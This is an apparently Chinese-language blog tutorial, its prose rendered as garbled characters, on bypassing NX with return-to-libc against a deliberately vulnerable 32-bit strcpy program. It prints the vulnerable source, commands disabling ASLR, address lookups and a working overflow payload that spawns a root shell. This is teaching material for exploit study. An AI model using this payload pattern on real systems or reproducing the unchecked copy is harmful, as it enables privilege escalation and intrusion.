---
layout: post
title: ͨ��returnToLibc�ƹ�NX
excerpt: "sploitfunϵ�н̳�֮2.1 returnToLibc"
categories: [sploitfunϵ�н̳�]
comments: true
---

#### ʲô��NX����
NX:No Execute,���������������ζ�ű�����ջ����������û��ִ��Ȩ�޶��Ҵ���ռ�û��д���Ȩ��

©������
```c
 //vuln.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
 char buf[256]; /* [1] */ 
 strcpy(buf,argv[1]); /* [2] */
 printf("%s\n",buf); /* [3] */
 fflush(stdout);  /* [4] */
 return 0;
}
```
����
```shell
echo 0 > /proc/sys/kernel/randomize_va_space
gcc -g -fno-stack-protector -o vuln vuln.c -m32
chmod 777 vuln
```
����`readelf -l vuln`�鿴ջ�ռ��Ȩ��
```
...
...
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00660 0x00660 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00118 0x00120 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000584 0x08048584 0x08048584 0x0002c 0x0002c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
...
...
```
��ʱ`GNU_STACK`�Ѿ�û����E��־λ(ִ��Ȩ��)

#### exp��д����
ͨ��`more /proc/19669/maps`�鿴libc�Ļ���ַ
```
08048000-08049000 r-xp 00000000 fd:00 69981924                           /root/sploitfun/vuln
08049000-0804a000 r--p 00000000 fd:00 69981924                           /root/sploitfun/vuln
0804a000-0804b000 rw-p 00001000 fd:00 69981924                           /root/sploitfun/vuln
f7e01000-f7e02000 rw-p 00000000 00:00 0 
f7e02000-f7fc6000 r-xp 00000000 fd:00 34048627                           /usr/lib/libc-2.17.so
f7fc6000-f7fc7000 ---p 001c4000 fd:00 34048627                           /usr/lib/libc-2.17.so
f7fc7000-f7fc9000 r--p 001c4000 fd:00 34048627                           /usr/lib/libc-2.17.so
f7fc9000-f7fca000 rw-p 001c6000 fd:00 34048627                           /usr/lib/libc-2.17.so
f7fca000-f7fcd000 rw-p 00000000 00:00 0 
f7fd8000-f7fd9000 rw-p 00000000 00:00 0 
f7fd9000-f7fda000 r-xp 00000000 00:00 0                                  [vdso]
f7fda000-f7ffc000 r-xp 00000000 fd:00 34036408                           /usr/lib/ld-2.17.so
f7ffc000-f7ffd000 r--p 00021000 fd:00 34036408                           /usr/lib/ld-2.17.so
f7ffd000-f7ffe000 rw-p 00022000 fd:00 34036408                           /usr/lib/ld-2.17.so
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```
�õ�libc����ַλ`f7e02000`

ͨ��`readelf -s /usr/lib/libc-2.17.so | grep system`�鿴system��offset
```shell
   246: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1454: 0003ef70    98 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
   513: 00000000     0 FILE    LOCAL  DEFAULT  ABS system.c
   514: 0003ea40  1089 FUNC    LOCAL  DEFAULT   13 do_system
  5193: 00132650    73 FUNC    LOCAL  DEFAULT   13 __GI_svcerr_systemerr
  7022: 0003ef70    98 FUNC    WEAK   DEFAULT   13 system
  7618: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr
  7683: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system
```
ͨ��`objdump -s /usr/lib/libc-2.17.so |less`����sh�ַ�������00��β
```
 0e5b8 5f6d6f64 64693300 696e6574 365f6f70  _moddi3.inet6_op
 0e5c8 745f6669 6e697368 005f494f 5f646566  t_finish._IO_def
 0e5d8 61756c74 5f787370 75746e00 5f5f7763  ault_xsputn.__wc
```
�õ�sh.λ��offsetΪ0e5ce,��sh.λ�õľ���λ��Ϊ`0xf7Ee05ce`

������Ҫ��ջ�ռ�������¹���
```
 ______
| AAAA |
|------|
| .... |
|------|
| AAAA |
|------|
|SYSTEM|
|------|
| AAAA |
|------|
|  SH  |
|______|
```


���Ľ��
```bash
./vuln `python -c 'print "A"*268 + "\x70\x0f\xe4\xf7"+"\xff\xff\xff\xff"+"\xce\x05\xe1\xf7"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��????��
sh-4.2# exit
exit
```
#### һ������
�����������СȨ��ԭ���û���ȡ����֮ǰɾ��rootȨ�ޡ���ˣ���ʹ�û������Ƕ���ģ�������Ҳ����õ�root shell����������
```c
//vuln_priv.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
 char buf[256];
 seteuid(getuid()); /* Temporarily drop privileges */ 
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 fflush(stdout);
 return 0;
}
```
��ô����ڳ���ʹ������СȨ��ԭ��������£���ȡrootȨ���أ�������ǵ�ջ�ռ��������죬��ôpwn֮��Ϳ��Ի�ȡrootȨ��

- seteuid(0)
- system(��sh��)
- exit()

�������ǾͿ��Ի��rootȨ�ޣ����ּ�������chaining of return-to-libc
